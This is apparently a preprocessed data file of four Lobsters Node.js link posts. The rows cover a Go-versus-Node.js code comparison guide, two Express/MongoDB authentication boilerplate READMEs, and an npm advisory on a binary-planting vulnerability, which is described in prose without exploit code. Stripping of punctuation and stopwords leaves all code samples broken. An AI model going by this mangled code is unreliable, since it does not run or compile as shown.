68,Lobsters,nodejs,Node.js programming,Golang for Node.js Developers,https://github.com/miguelmota/golang-for-nodejs-developers,golang nodejs developer,golang nodejs developer golang nodejs tour go content example example comment nodejs go printing nodejs go variable nodejs go interpolation nodejs go type nodejs go type check nodejs go ifelse nodejs go nodejs go nodejs go switch nodejs go array nodejs go array nodejs go array iteration nodejs go array sorting nodejs go buffer nodejs go map nodejs go object nodejs go function nodejs go default value nodejs go destructuring nodejs go spread operator nodejs go rest operator nodejs go swapping nodejs go class nodejs go generator nodejs go datetime nodejs go timeout nodejs go interval nodejs go iife nodejs go file nodejs go json nodejs go big number nodejs go promise nodejs go asyncawait nodejs go stream nodejs go event emitter nodejs go error nodejs go trycatch nodejs go exception nodejs go regex nodejs go exec sync nodejs go exec async nodejs go tcp server nodejs go udp server nodejs go http server nodejs go url parse nodejs go gzip nodejs go dns nodejs go crypto nodejs go env var nodejs go cli args nodejs go cli flag nodejs go stdout nodejs go stderr nodejs go stdin nodejs go module nodejs go stack trace nodejs go database nodejs go testing nodejs go benchmarking nodejs go documentation nodejs jsdoc go godoc contributing example license mit,golang nodejs developer example golang example compared nodejs learning guide full example intended people learning go coming nodejs although vice versa work meant complete guide assumed gone tour go tutorial guide meant barely good enough help high level understand x learning course required content example sample code available example comment nodejs line comment block comment go package main func main line comment block comment printing nodejs consolelog hello world consolelog hello world consolelog hello world output hello world hello world hello world go package main import fmt func main fmtprintln hello world fmtprintln hello world fmtprintln hello world output hello world hello world hello world variable nodejs function scoped var foo foo block scoped let bar bar constant const qux qux go variable block scoped go package main func main explicit var foo string foo type inferred var bar foo shorthand baz bar constant const qux qux interpolation nodejs const name bob const age const message name age year old consolelog message output go package main import fmt func main name bob age message fmtsprintf year old name age fmtprintln message output type nodejs primitive const mybool true const mynumber const mystring foo const mysymbol symbol bar const mynull null const myundefined undefined object type const myobject const myarray const myfunction function const myerror new error error const mydate new date const myregex const mymap new map const myset new set const mypromise promiseresolve const mygenerator function const myclass class go package main func main primitive var mybool bool true var myint int var var var var var myuint uint var var var var var myuintptr uintptr var var var var var mystring string foo var mybyte byte alias var myrune rune alias composite type var mystruct struct struct var myarray string string var mymap map string int map string int var myfunction func func var mychannel chan bool make chan bool var myinterface interface nil var mypointer int new int type check nodejs function typeof obj return tostringcall obj split slice tolowercase const value true foo symbol bar null undefined nan function new error new date new map new set promiseresolve function class value value consolelog typeof value output boolean number string symbol null undefined number object array function error date regexp map set promise generatorfunction function go package main import fmt reflect regexp time func main value interface true uint uintptr foo byte rune struct string map string int func make chan bool nil new int timenow regexpmustcompile value range value fmtprintln reflecttypeof value output bool uint uintptr string struct string map string int func chan bool nil int timetime regexpregexp ifelse nodejs const array array consolelog array exists arraylength consolelog length else arraylength consolelog length else consolelog length const isoddlength arraylength yes consolelog isoddlength output array exists length go package main import fmt func main array byte array nil fmtprintln array exists len array fmtprintln length else len array fmtprintln length else fmtprintln length closest thing ternary operator isoddlength len array isoddlength yes fmtprintln isoddlength output array exists length nodejs let consolelog output go package main import fmt func main fmtprintln output nodejs let consolelog output go keyword go functionality achieved using package main import fmt func main fmtprintln output switch nodejs const value b switch value case consolelog break case b consolelog b break case c consolelog c break default consolelog first default switch value case consolelog falling case b consolelog b falling case c consolelog c falling default consolelog second default output b b falling c falling second default go package main import fmt func main value b switch value case fmtprintln case b fmtprintln b case c fmtprintln c default fmtprintln first default switch value case fmtprintln falling fallthrough case b fmtprintln b falling fallthrough case c fmtprintln c falling fallthrough default fmtprintln second default output b b falling c falling second default array example slicing copying appending prepending array nodejs const array consolelog array const clone arrayslice consolelog clone const sub arrayslice consolelog sub const concatenated cloneconcat consolelog concatenated const prepended concat concatenated consolelog prepended output go package main import fmt func main array int fmtprintln array clone make int len array copy clone array fmtprintln clone sub array fmtprintln sub concatenated append array int fmtprintln concatenated prepended append int concatenated fmtprintln prepended output array nodejs const array new consolelog array const offset arrayset offset consolelog array const sub arraysubarray consolelog sub const arraysubarray consolelog consolelog array const value const start const end arrayfill value start end consolelog array consolelog arraybytelength output go package main import fmt func main array make fmtprintln array offset copy array offset fmtprintln array sub array fmtprintln sub array fmtprintln fmtprintln array value start end start end array value fmtprintln array fmtprintln len array output array iteration example iterating mapping filtering reducing array nodejs const array b c arrayforeach value consolelog value const mapped arraymap value return valuetouppercase consolelog mapped const filtered arrayfilter value return consolelog filtered const reduced arrayreduce acc value accpush valuetouppercase return acc consolelog reduced output b c b c c c go package main import fmt string func main array string b c value range array fmtprintln value mapped make string len array value range array mapped stringstoupper value fmtprintln mapped var filtered string value range array filtered append filtered value fmtprintln filtered var reduced string value range array reduced append reduced stringstoupper value fmtprintln reduced output b c b c c c array sorting example sort array nodejs const stringarray z b c const stringarraysortedasc stringarraysort b b consolelog stringarraysortedasc const stringarraysorteddesc stringarraysort b b consolelog stringarraysorteddesc const numberarray const numberarraysortedasc numberarraysort b b consolelog numberarraysortedasc const numberarraysorteddesc numberarraysort b b consolelog numberarraysorteddesc const collection name li l age name json c age name zack w age name yi age const collectionsortedbyageasc collectionsort b aage bage consolelog collectionsortedbyageasc const collectionsortedbyagedesc collectionsort b bage aage consolelog collectionsortedbyagedesc output b c z z c b name yi age name json c age name li l age name zack w age name zack w age name li l age name json c age name yi age go package main import fmt sort type person struct name string age int type personcollection person func pc personcollection len int return len pc func pc personcollection swap j int pc pc j pc j pc func pc personcollection le j int bool asc return pc age pc j age func main intlist int asc sortints intlist fmtprintln intlist desc sortsort sortreverse sortintslice intlist fmtprintln intlist stringlist string z b c asc sortstrings stringlist fmtprintln stringlist desc sortsort sortreverse sortstringslice stringlist fmtprintln stringlist collection person li l json c zack w yi asc sortsort personcollection collection fmtprintln collection desc sortsort sortreverse personcollection collection fmtprintln collection output b c z z c b yi json c li l zack w zack w li l json c yi buffer example allocate buffer write big little endian format encode hex string check buffer equal nodejs const buf bufferalloc let value let offset let bytelength bufwriteuintbe value offset bytelength let hexstr buftostring hex consolelog hexstr const bufferalloc value offset bytelength value offset bytelength hexstr hex consolelog hexstr let isequal buffercompare buf consolelog isequal isequal buffercompare buf buf consolelog isequal output false true go package main import byte encodingbinary encodinghex fmt log mathbig reflect func writeuintbe buffer byte value offset bytelength slice make byte bytelength val new bigint value valbytes valbytes buf bytesnewbuffer slice err binarywrite buf binarybigendian valbytes err nil logfatal err slice bufbytes slice slice len slice bytelength len slice copy buffer offset slice func writeuintle buffer byte value offset bytelength slice make byte bytelength val new bigint value valbytes valbytes tmp make byte len valbytes range valbytes tmp valbytes len valbytes copy slice tmp copy buffer offset slice func main buf make byte writeuintbe buf fmtprintln hexencodetostring buf make byte writeuintle fmtprintln hexencodetostring isequal reflectdeepequal buf fmtprintln isequal isequal reflectdeepequal buf buf fmtprintln isequal output false true map nodejs const map new map mapset foo bar let found maphas foo consolelog found let item mapget foo consolelog item mapdelete foo found maphas foo consolelog found item mapget foo consolelog item const foo bar item foo delete foo const new map foo bar baz let key value consolelog key value output true bar false undefined foo bar baz go package main import fmt func main make map string string foo bar item found foo fmtprintln found fmtprintln item delete foo item found foo fmtprintln found fmtprintln item make map string int foo bar baz key value range fmtprintln key value output true bar false foo bar baz object nodejs const obj someproperties foo bar somemethod prop return objsomeproperties prop let item objsomeproperties foo consolelog item item objsomemethod foo consolelog item output go package main import fmt type obj struct someproperties map string string func newobj obj return obj someproperties map string string foo bar func obj somemethod prop string string return osomeproperties prop func main obj newobj item objsomeproperties foo fmtprintln item item objsomemethod foo fmtprintln item output function nodejs function add b return b const result add consolelog result output go package main import fmt func add int b int int return b func main result add fmtprintln result output default value nodejs function greet name stranger return hello name let message greet consolelog message message greet bob consolelog message output go use pointer check nil know explicitly left blank package main import fmt func greet name string string n stranger name nil n name return fmtsprintf hello n func main message greet nil fmtprintln message name bob message greet name fmtprintln message output destructuring nodejs const obj key foo value bar const key value obj consolelog key value output go package main import fmt type obj struct key string value string func obj read string string return okey ovalue func main obj obj key foo value bar option multiple variable assignment key value objkey objvalue fmtprintln key value option return multiple value function key value objread fmtprintln key value output spread operator nodejs const array consolelog array output go package main import fmt func main array byte var interface value range array append value fmtprintln output rest operator nodejs function sum nums let let n nums n return const total sum consolelog total output go package main import fmt func sum nums int int var int n range nums n return func main total sum fmtprintln total output swapping nodejs let foo let b bar consolelog b b b consolelog b output go package main import fmt func main foo b bar fmtprintln b b b fmtprintln b output class example class constructor instantiation keyword nodejs class foo constructor value thisitem value getitem return thisitem setitem value thisitem value const foo new foo bar consolelog fooitem foosetitem qux const item foogetitem consolelog item output go closest thing class use structure package main import fmt type foo struct item string func newfoo value string foo return foo item value func f foo getitem string return fitem func f foo setitem value string fitem value func main foo newfoo bar fmtprintln fooitem foosetitem qux item foogetitem fmtprintln item output generator nodejs function generator yield hello yield world let gen generator true let value done gennext consolelog value done done break alternatively let value generator consolelog value output hello false world false undefined true hello world go package main import fmt func generator chan string c make chan string go func c hello c world close c return c func generatorfunc func string bool string hello world return func string bool len return false return true func main gen generator value gen fmtprintln value break alternatively value range generator fmtprintln value alternatively genfn generatorfunc value genfn fmtprintln value break output hello true world true false hello world hello true world true false datetime example parsing formatting getting unix timestamp date nodejs const nowunix datenow consolelog nowunix const datestr const date new date datestr consolelog dategettime consolelog datetostring const futuredate new date date futuredatesetdate dategetdate consolelog futuredatetostring const formatted string dategetmonth padstart string dategetdate padstart dategetfullyear consolelog formatted output thu jan pacific standard time thu jan pacific standard time go package main import fmt time func main nowunix timenow unix fmtprintln nowunix datestr date err timeparse datestr err nil panic err fmtprintln dateunix fmtprintln datestring futuredate dateadddate fmtprintln futuredatestring formatted dateformat fmtprintln formatted output timeout nodejs settimeout callback function callback consolelog called output go package main import fmt sync time var wg syncwaitgroup func callback defer wgdone fmtprintln called func main wgadd timeafterfunc timesecond callback wgwait output interval nodejs let const id setinterval callback function callback consolelog called clearinterval id output called called called called go package main import fmt time func callback int fmtprintln called func main ticker timenewticker timesecond range tickerc callback tickerstop break output called called called called iife immediately invoked function expression nodejs function name consolelog hello name bob output go package main import fmt func main func name string fmtprintln hello name bob output file example creating opening writing reading closing deleting file nodejs const f require f create file fsclosesync fsopensync testtxt w open file return file descriptor const fd fsopensync testtxt r let wbuf bufferfrom hello world let rbuf bufferalloc let let len let po write file fswritesync fd wbuf po read file fsreadsync fd rbuf len po consolelog rbuftostring close file fsclosesync fd delete file fsunlinksync testtxt output go package main import fmt o syscall func main create file file err oscreate testtxt err nil panic err close file fileclose open file file err osopenfile testtxt osordwr err nil panic err file descriptor fd filefd open file using file descriptor file osnewfile fd test file wbuf byte hello world rbuf make byte var write file err filewriteat wbuf err nil panic err read file err filereadat rbuf err nil panic err fmtprintln string rbuf close file using file descriptor err syscallclose int fd err nil panic err delete file err osremove testtxt err nil panic err output json example parse unmarshal stringify marshal json nodejs let jsonstr foo bar let parsed jsonparse jsonstr consolelog parsed jsonstr jsonstringify parsed consolelog jsonstr output foo bar foo bar go package main import encodingjson fmt type struct foo string json foo func main jsonstr foo bar new err jsonunmarshal byte jsonstr err nil panic err fmtprintln marshalled err jsonmarshal jsonstr string marshalled fmtprintln jsonstr output big number example creating big number type uint string hex buffer nodejs const bn require bnjs let bn new bn consolelog bntostring bn new bn consolelog bntostring bn new bn hex consolelog bntostring bn new bn hex consolelog bntostring bn new bn bufferfrom hex consolelog bntostring consolelog bntonumber consolelog bntostring hex consolelog bntobuffer let new bn let isequal bncmp consolelog isequal new bn hex isequal bncmp consolelog isequal output buffer false true go package main import encodinghex fmt mathbig func main bn new bigint fmtprintln bnstring bn new bigint bnsetstring fmtprintln bnstring bn new bigint fmtprintln bnstring bn new bigint bnsetstring fmtprintln bnstring bn new bigint bnsetbytes byte fmtprintln bnstring fmtprintln fmtprintln hexencodetostring bnbytes fmtprintln bnbytes bignewint isequal bncmp fmtprintln isequal bignewint isequal bncmp fmtprintln isequal output false true promise nodejs function asyncmethod value return new promise resolve reject settimeout resolve resolved value function main asyncmethod foo result consolelog result catch err consoleerror err promiseall asyncmethod asyncmethod b asyncmethod c result consolelog result catch err consoleerror err main output resolved foo resolved resolved b resolved c go closest thing use channel package main import fmt sync time githubcomprometheuscommonlog func asyncmethod value string chan interface ch make chan interface go func timesleep timesecond ch resolved value close ch return ch func resolveall ch chan interface chan interface var wg syncwaitgroup re make string len ch resch make chan interface go func c range ch wgadd go func j int ifcch chan interface ifc ifcch switch v ifc type case error resch v case string re j v wgdone c wgwait resch re close resch return resch func main var wg syncwaitgroup wgadd go func result asyncmethod foo switch v result type case string fmtprintln v case error logerrorln v wgdone go func result resolveall asyncmethod asyncmethod b asyncmethod c switch v result type case string fmtprintln v case error logerrorln v wgdone wgwait output resolved foo resolved resolved b resolved c asyncawait nodejs function hello name return new promise resolve reject settimeout name fail reject new error failed else resolve hello name async function main try let output await hello bob consolelog output output await hello fail consolelog output catch err consolelog errmessage main output go closest thing use channel package main import error fmt time githubcomprometheuscommonlog func hello name string chan interface ch make chan interface go func timesleep timesecond name fail ch errorsnew failed else ch hello name return ch func main result hello bob switch v result type case string fmtprintln v case error logerrorln v result hello fail switch v result type case string fmtprintln v case error logerrorln v output stream example reading writing stream nodejs const readable writable require stream const instream new readable instreampush bufferfrom foo instreampush bufferfrom bar instreampush null end stream instreampipe processstdout const outstream new writable write chunk encoding callback consolelog received chunktostring callback outstreamwrite bufferfrom abc outstreamwrite bufferfrom xyz outstreamend output foobar received abc received xyz go package main import bufio byte fmt io o runtime func main instream new bytesbuffer w bufionewwriter instream err wwrite byte foo err nil panic err err wwrite byte bar err nil panic err err wflush err nil panic err instreamwriteto osstdout fmtprint n outstream new bytesbuffer outstreamwrite byte abcn outstreamwrite byte xycn piper pipew iopipe go func sc bufionewscanner piper scscan fmtprintln received sctext err scerr err nil panic err osexit go func defer pipewclose iocopy pipew outstream defer runtimegoexit output foobar received abc received xyc event emitter nodejs const eventemitter require event class myemitter extends eventemitter const myemitter new myemitter myemitteron myevent msg consolelog msg myemitteron myotherevent msg consolelog msg myemitteremit myevent hello world myemitteremit myotherevent hello world output hello world hello world go closest thing use channel package main import fmt type myemitter map string chan string func main myemitter myemitter myemitter myevent make chan string myemitter myotherevent make chan string go func select case msg myemitter myevent fmtprintln msg case msg myemitter myotherevent fmtprintln msg myemitter myevent hello world myemitter myotherevent hello world output hello world hello world error nodejs const new error error consolelog class fooerror extends error constructor message super message thisname fooerror thismessage message tostring return thismessage const new fooerror custom error consolelog output error error fooerror custom error go package main import error fmt type fooerror struct string func f fooerror error string return f func newfooerror string error return fooerror func main errorsnew error fmtprintln newfooerror custom error fmtprintln output error custom error trycatch nodejs function foo fail fail throw error error function main try foo true catch err consolelog caught error errmessage main output go package main import error fmt func foo fail bool error fail return errorsnew error return nil func main err foo true err nil fmtprintf caught error sn errerror output exception nodejs function foo throw error exception function main foo processon uncaughtexception err consolelog caught exception errmessage processexit main output caught exception exception go package main import fmt func foo panic exception func main defer func r recover r nil fmtprintf caught exception r foo output caught exception exception regex nodejs let input foobar let replaced inputreplace foo qux consolelog replaced let match itest input consolelog match input let match inputmatch gi consolelog match output quxbar true go package main import fmt regexp func main input foobar regexpmustcompile foo replaced rereplaceallstring input qux fmtprintln replaced regexpmustcompile match rematch byte input fmtprintln match input regexpmustcompile match refindallstring input fmtprintln match output quxbar true exec sync nodejs const execsync require childprocess const output execsync echo hello world consolelog outputtostring output go package main import fmt osexec func main output err execcommand echo hello world output err nil panic err fmtprintln string output output exec async nodejs const exec require childprocess exec echo hello world error stdout stderr error consoleerror err stderr consoleerror stderr stdout consolelog stdout output go package main import o osexec func main cmd execcommand echo hello world cmdstdout osstdout cmdstderr osstderr cmdrun output tcp server nodejs const net require net function handler socket socketwrite received socketpipe socket const server netcreateserver handler serverlisten output echo hello nc localhost received hello go package main import bufio net func handler conn netconn defer connclose reader bufionewreader conn message err readerreadstring n err nil return connwrite byte received connwrite byte message func main listener err netlisten tcp err nil panic err defer listenerclose conn err listeneraccept err nil panic err go handler conn output echo hello nc localhost received hello udp server nodejs const dgram require dgram const server dgramcreatesocket serveron error err consoleerror err serverclose serveron message msg rinfo const data msgtostring trim consolelog received data rinfoaddress rinfoport serveron listening const address serveraddress consolelog server listening addressaddress addressport serverbind output echo hello world server listening received hello world go package main import fmt net string func main conn err netlistenudp udp netudpaddr port ip netparseip err nil panic err defer connclose fmtprintf server listening sn connlocaladdr string message make byte rlen remote err connreadfromudp message err nil panic err data stringstrimspace string message rlen fmtprintf received sn data remote output echo hello world server listening received hello world http server nodejs const http require http function handler request response responsewritehead contenttype textplain responsewrite hello world responseend const server httpcreateserver handler serverlisten output curl http hello world go package main import nethttp func handler w httpresponsewriter r httprequest wwriteheader wwrite byte hello world func main httphandlefunc handler err httplistenandserve nil err nil panic err output curl http hello world url parse nodejs const url require url const q require querystring const urlstr http bob secret foobar const parsed urlparse urlstr consolelog parsedprotocol consolelog parsedauth consolelog parsedport consolelog parsedhostname consolelog parsedpathname consolelog qsparse parsedsearchsubstr output http bob secret subexamplecom somepath foo bar go package main import fmt neturl func main urlstr http bob secret foobar u err urlparse urlstr err nil panic err fmtprintln uscheme fmtprintln uuser fmtprintln uport fmtprintln uhostname fmtprintln upath fmtprintln uquery output http bob secret subexamplecom somepath map foo bar gzip nodejs const zlib require zlib const data bufferfrom hello world zlibgzip data err compressed err consoleerror err consolelog compressed zlibunzip compressed err decompressed err consoleerror err consolelog decompressedtostring output buffer cb cd cf ca hello world go package main import byte compressgzip fmt func main data byte hello world compressed new bytesbuffer w gzipnewwriter compressed err wwrite data err nil panic err err wclose err nil panic err fmtprintln compressedbytes decompressed new bytesbuffer r err gzipnewreader compressed err nil panic err err decompressedreadfrom r err nil panic err fmtprintln string decompressedbytes output hello world dns txt lookup example nodejs const dns require dns googlecom err ip err consoleerror err consolelog ip dnsresolvemx googlecom err mx err consoleerror err consolelog mx dnsresolvetxt googlecom err txt err consoleerror err consolelog txt output exchange priority exchange priority exchange priority exchange aspmxlgooglecom priority exchange priority include spfgooglecom go package main import fmt net func main ip err netlookupip googlecom err nil panic err fmtprintln ip mx err netlookupmx googlecom err nil panic err fmtprintln mx txt err netlookuptxt googlecom err nil panic err fmtprintln txt output include spfgooglecom crypto nodejs const crypto require crypto const hash cryptocreatehash update bufferfrom hello digest consolelog hashtostring hex output go package main import encodinghex fmt func main hash byte hello fmtprintln hexencodetostring hash output env var nodejs const key processenv apikey consolelog key output apikeyfoobar node examplesenvvarsjs foobar go package main import fmt o func main key osgetenv apikey fmtprintln key output apikeyfoobar go run examplesenvvarsgo foobar cli args nodejs const args processargvslice consolelog args output node examplescliargsjs foo bar qux foo bar qux go package main import fmt o func main args osargs fmtprintln args output go run examplescliargsgo foo bar qux foo bar qux cli flag nodejs const yargs require yargs const foodefault value quxfalse yargsargv consolelog foo foo consolelog qux qux output node examplescliflagsjs foobar quxtrue foo bar qux true go package main import flag fmt func main var foo string flagstringvar foo foo default value string var var qux bool flagboolvar qux qux false bool var flagparse fmtprintln foo foo fmtprintln qux qux output go run examplescliflagsgo foobar quxtrue foo bar qux true stdout nodejs processstdoutwrite hello worldn output go package main import fmt o func main fmtfprint osstdout hello worldn output stderr nodejs processstderrwrite hello errorn output go package main import fmt o func main fmtfprint osstderr hello errorn output stdin nodejs const stdin processopenstdin processstdoutwrite enter name stdinaddlistener data text const name texttostring trim consolelog name name stdinpause output enter name bob name bob go package main import bufio fmt o string func main reader bufionewreader osstdin fmtprint enter name text err readerreadstring n err nil panic err name stringstrimspace text fmtprintf name sn name output enter name bob name bob module nodejs initializing metadata dependency file packagejson npm init installing module npm install moment save updating module npm install moment latest save removing module npm uninstall moment save pruning module removing unused module npm prune publishing module npm publish importing module const moment require moment const moment unix consolelog output exporting module moduleexports greet name consolelog hello name importing exported module const greeter require greeter greetergreet bob output go setup enable go module support initializing dependency file gomod go mod init installing module go get githubcomgoshadowmoment updating module go get u githubcomgoshadowmoment removing module rm rf gopathpkgmodgithubcomgoshadowmoment v tag checksum pruning module removing unused module dependency file go mod tidy download module used local vendor directory equivalent downloading nodemodules locally go mod vendor publishing module note go nt index repository like npm go module hosted public git repository publish simply push repository tag release package main import fmt importing module githubcomgoshadowmoment func main momentnew unix fmtprintln output package greeter import fmt exporting module use capitalized name export function func greet name string fmtprintf hello name package main import importing exported module greeter githubcommiguelmotagolangfornodejsdevelopersexamplesgreetergo func main greetergreet bob output stack trace nodejs function foo throw new error failed try foo catch err consoletrace err output trace error failed foo object anonymous modulecompile objectmoduleextensions j moduleload trymoduleload functionmoduleload functionmodulerunmain startup bootstrapnodejscore object anonymous modulecompile objectmoduleextensions j moduleload trymoduleload functionmoduleload functionmodulerunmain startup bootstrapnodejscore go package main import error fmt runtimedebug func foo panic errorsnew failed func main defer func r recover r nil fmtprintln string debugstack foo output goroutine running runtimedebugstack panic mainfoo mainmain database example creating table inserting row reading row database nodejs const require verbose const db new dbserialize dbrun create table person name text const stmt dbprepare insert person value const name alice bob charlie let nameslength stmtrun name stmtfinalize dbeach select rowid id name person err row err consoleerror err return consolelog rowid rowname dbclose output alice bob charlie go package main import databasesql fmt func main db err sqlopen err nil panic err defer dbclose err dbexec create table person name text err nil panic err tx err dbbegin err nil panic err stmt err txprepare insert person value err nil panic err defer stmtclose name string alice bob charlie name range name err stmtexec name err nil panic err txcommit row err dbquery select rowid id name person err nil panic err defer rowsclose rowsnext var id int var name string err rowsscan id name err nil panic err fmtprintln id name err rowserr err nil panic err output testing nodejs const test require tape test const tt tplan ttlength ttforeach tt tequal sum tta ttb ttret function sum b return b output node examplesexampletestjs tap version anonymous ok equal ok equal ok equal test pas ok go package example import fmt testing func testsum testingt tt range struct int b int ret int trun fmtsprintf v v tta ttb func testingt ret sum tta ttb ret ttret terrorf want v got v ttret ret func sum b int int return b output go test v examplesexampletestgo run testsum run testsum run testsum run testsum pas testsum pas testsum pas testsum pas testsum pas ok commandlinearguments benchmarking nodejs const benchmark require benchmark const suite new benchmarksuite suiteadd fib recursion fibrec add fib loop fibloop complete consolelog suite tostring consolelog suite tostring run async true function fibrec n n return n return fibrec fibrec function fibloop n let f let n f f f return f n output node examplesbenchmarktestjs fib recursion x opssec run sampled fib loop x opssec run sampled go package example import testing func benchmarkfibrec b testingb n n bn n fibrec func benchmarkfibloop b testingb n n bn n fibloop func fibrec n int int n return n return fibrec fibrec func fibloop n int int f make int n f f f f n f f f return f n output go test v bench benchmem examplesbenchmarktestgo goo darwin goarch nsop bop allocsop nsop bop allocsop pas ok commandlinearguments documentation nodejs jsdoc creates new person class example const person new person bob class person create person param string name person name constructor name thisname name get person name return string person name example persongetname getname return thisname set person name param string name person name example personsetname bob setname name thisname name go godoc persongo package person import fmt person structure person type person struct name string newperson creates new person take name argument func newperson name string person return person name name getname return person name func p person getname string return pname setname set person name func p person setname name string string return pname persontestgo example creating new person func examplenewperson person newperson bob person example getting person name func examplepersongetname person newperson bob fmtprintln persongetname output bob example setting person name func examplepersonsetname person newperson alice personsetname bob contributing pull request welcome please submit pull request new interesting addition general content fix updating code update readme code example folder license mit
69,Lobsters,nodejs,Node.js programming,"Node.js boilerplate / REST API / Authentication from scratch - (express, mongodb)",https://github.com/watscho/express-mongodb-rest-api-boilerplate,nodejs boilerplate rest api authentication scratch express mongodb,also expressgraphqlmongodbboilerplate graphql api boilerplate authentication scratch sign sign reset password change password update user email verification multi language redis token blacklisting package list redis homebrew introducing yarn workspace note nodemon api start docker compose eslint start api structure api endpoint note issue license mit license,also expressgraphqlmongodbboilerplate graphql api boilerplate authentication scratch sign sign reset password change password update user email verification multi language redis token blacklisting package list package description bcryptjs optimized bcrypt javascript zero dependency compatible c bcrypt binding nodejs also working browser cors cors nodejs package providing connectexpress middleware used enable cors various option cryptorandomstring generate cryptographically strong random string dotenv dotenv zerodependency module load environment variable env file processenv storing configuration environment separate code based twelvefactor app methodology ejs embedded javascript template emailtemplates create preview send custom email template nodejs highly configurable support automatic inline cs stylesheets embedded image font much made sending beautiful email lad express fast unopinionated minimalist web framework node httpstatuscodes constant enumerating http status code popular internationalization framework browser javascript environment eg nodejs middleware use expressjs ioredis robust performancefocused fullfeatured redis client nodejs jsonwebtoken developed make use nodejws modulealias create alias directory register custom module path nodejs like bos moment lightweight javascript date library parsing validating manipulating formatting date mongoose mongoose mongodb object modeling tool designed work asynchronous environment mongoose support promise callback nodemailer send email nodejs easy cake validator library string validators sanitizers winston logger everything redis mac using homebrew linux sudo aptget install redisserver introducing yarn workspace copy envexample env note highly recommend installing nodemon nodemon tool help develop nodejs based application automatically restarting node application file change directory detected nodemon require additional change code method development nodemon replacement wrapper node use nodemon replace word node command line executing script yarn global add nodemon api start yarn start yarn start local nodemon docker compose dockercompose build dockercompose f dockercomposedevyml build nodemon eslint start yarn lint yarn lint write prefix fix api structure src locale enjson gejson indexjs middleware authenticationjs authmiddlewarejs indexjs module auth mail indexjs usermailjs service indexjs userservicejs authcontrollerjs indexjs userjs indexjs route authjs indexjs service loggerjs nodemailerjs validator indexjs uservalidatorjs view template resetpassword htmlejs verify htmlejs verifyrequest htmlejs indexjs mongoosejs redisjs dockerignore envexample eslintignore eslint gitignore dockerfile dockerfiledev license readmemd dockercomposedevyml dockercomposeyml packagejson api endpoint note question issue license project opensource mit license
70,Lobsters,nodejs,Node.js programming,Binary Planting with the npm CLI,https://blog.npmjs.org/post/189618601100/binary-planting-with-the-npm-cli,binary planting npm cli,vulnerability current risk fix thank security npmjscom,tl dr update npm soon possible system fix vulnerability allowing arbitrary path accessthe vulnerabilitiesin version npm prior version yarn prior properly constructed entry packagejson bin field would allow package publisher modify andor gain access arbitrary file user system package installedin version npm prior version yarn announcement possible globallyinstalled package binary entry overwrite existing binary target install location arbitrary file system file usrlocalbin mitigating factor vulnerability malicious actor would get victim install package specially crafted bin entry however seen past insurmountable barriercurrent riskthe npm inc security team scanning registry example attack found published package registry exploit guarantee used mean currently used published package registrywe continue monitoring take action prevent bad actor exploiting vulnerability future however scan possible source npm package private registry mirror git repository etc important update soon possiblethe fixthe packagejson parsing library use npm updated would sanitize validate entry bin field remove leading slash path entry mean path escape using well tested highly reliable path utility built nodejsthe fix reviewed npm inc security team showed prevented arbitrary path manipulation reportedthe bin script linking library use npm updated installing binary entry toplevel globally installed package overwrite existing binary file currently installed behalf package installed example npm install foo could overwrite usrlocalbinfoo usrlocalbinfoo currently link previously installed version foothis second fix also reviewed npm inc security team showed prevented bin file overwriting exploitto patch vulnerability please run npm install g npm soon possiblethank vulnerability responsibly reported daniel ruf greatly appreciate daniel help keeping community safeif think found security issue npm cli encourage report security npmjscom help triage disclosure process
71,Lobsters,nodejs,Node.js programming,"Node.js boilerplate / Authentication from scratch - (express, graphql, mongodb)",https://github.com/watscho/express-graphql-mongodb-boilerplate,nodejs boilerplate authentication scratch express graphql mongodb,also expressmongodbrestapiboilerplate restapi boilerplate authentication scratch sign sign reset password change password update user email verification multi language redis token blacklisting package list redis homebrew copy envexample env note nodemon api start docker compose eslint start api structure note graphqlcompose doc query mutation note issue license mit license,also expressmongodbrestapiboilerplate restapi boilerplate authentication scratch sign sign reset password change password update user email verification multi language redis token blacklisting package list package description bcryptjs optimized bcrypt javascript zero dependency compatible c bcrypt binding nodejs also working browser cors cors nodejs package providing connectexpress middleware used enable cors various option cryptorandomstring generate cryptographically strong random string dotenv dotenv zerodependency module load environment variable env file processenv storing configuration environment separate code based twelvefactor app methodology ejs embedded javascript template emailtemplates create preview send custom email template nodejs highly configurable support automatic inline cs stylesheets embedded image font much made sending beautiful email lad express fast unopinionated minimalist web framework node expressgraphql create graphql http server http web framework support connect styled middleware including connect express restify graphql javascript reference implementation graphql query language apis created facebook graphqlcompose graphql query language apis graphqljs reference implementation graphql nodejs introduce graphql type system describing schema definition configuration executes query server side expressgraphql http server get request data pass graphqljs returned result pass response graphqlcomposemongoose plugin graphqlcompose derives graphqltype mongoose model also derives bunch internal graphql type provide crud resolvers including graphql connection also provided basic search via operator lt gt popular internationalization framework browser javascript environment eg nodejs middleware use expressjs ioredis robust performancefocused fullfeatured redis client nodejs jsonwebtoken developed make use nodejws modulealias create alias directory register custom module path nodejs like bos moment lightweight javascript date library parsing validating manipulating formatting date mongoose mongoose mongodb object modeling tool designed work asynchronous environment mongoose support promise callback nodemailer send email nodejs easy cake validator library string validators sanitizers winston logger everything redis mac using homebrew linux sudo aptget install redisserver copy envexample env note highly recommend installing nodemon nodemon tool help develop nodejs based application automatically restarting node application file change directory detected nodemon require additional change code method development nodemon replacement wrapper node use nodemon replace word node command line executing script yarn global add nodemon api start yarn start yarn start local nodemon docker compose dockercompose build dockercompose f dockercomposedevyml build nodemon eslint start yarn lint yarn lint write prefix fix api structure src graphql indexjs schemajs typesjs locale enjson gejson indexjs middleware authenticationjs authmiddlewarejs indexjs module auth mail indexjs usermailjs service indexjs userservicejs indexjs resolversjs typesjs userjs indexjs service loggerjs nodemailerjs validator indexjs uservalidatorjs view template resetpassword htmlejs verify htmlejs verifyrequest htmlejs indexjs mongoosejs redisjs dockerignore envexample eslintignore eslint gitignore dockerfile dockerfiledev license readmemd dockercomposedevyml dockercomposeyml packagejson note continue development learn graphqlcompose library use write api read link doc query query user user id email firstname lastname locale account verification verified updatedat createdat mutation mutation signin email string password string signin email email password password accesstoken mutation signup email string password string signup email email password password accesstoken mutation logout logout succeed mutation verifyrequest verifyrequest succeed mutation verify token string verify token token accesstoken mutation resetpassword email string resetpassword email email succeed mutation newpassword token string newpassword string newpassword token token newpassword newpassword accesstoken mutation changepassword currentpassword string newpassword string changepassword currentpassword currentpassword newpassword newpassword succeed mutation updateuser email string firstname string lastname string updateuser email email firstname firstname lastname lastname id email firstname lastname locale account verification verified updatedat createdat mutation switchlocale locale locale switchlocale locale locale id email firstname lastname locale account verification verified updatedat createdat note question issue license project opensource mit license
